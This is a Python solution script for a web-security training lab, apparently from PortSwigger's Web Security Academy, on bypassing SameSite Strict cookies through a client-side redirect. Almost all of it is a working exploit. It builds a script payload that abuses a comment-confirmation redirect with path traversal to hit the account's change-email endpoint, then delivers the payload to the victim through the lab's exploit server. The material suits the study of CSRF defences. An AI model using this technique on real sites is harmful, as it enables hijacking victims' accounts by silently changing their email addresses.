####################################################################################
#
# Lab: SameSite Strict bypass via client-side redirect
#
# Hack Steps: 
#      1. Exploit the redirection functionality that occurs after 
#         a comment is submitted in order to redirect the victim to their profile  
#         and change their email using URL parameters
#      2. Deliver the exploit to the victim
#      3. The victim's email will be changed after they trigger the exploit
#
####################################################################################
import requests
from colorama import Fore

# Change this to your lab URL
LAB_URL = "https://0a3000ea0408bfc583dc143e005a00a5.web-security-academy.net"

# Change this to your exploit server URL
EXPLOIT_SERVER_URL = "https://exploit-0a1100990420bf3a83a21390019f0037.exploit-server.net"

def main():
    new_email = "hacked@you.com" # You can change this to what you want
    payload = f"""<script>
                    location = "{LAB_URL}/post/comment/confirmation?postId=../my-account/change-email%3femail={new_email}%26submit=1"
                </script>"""
    response_head = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"
    data = { "responseBody": payload, "responseHead": response_head, "formAction": "DELIVER_TO_VICTIM", "urlIsHttps": "on", "responseFile": "/exploit" }

    print("❯❯ Delivering the exploit to the victim.. ", end="", flush=True)
    
    post_data(EXPLOIT_SERVER_URL, data)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The victim's email will be changed after they trigger the exploit") 
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")


def post_data(url, data):
    try:    
        return requests.post(url, data)
    except:
        print(Fore.RED + "⦗!⦘ Failed to post data to " + url + " through exception")
        exit(1)


if __name__ == "__main__":
    main()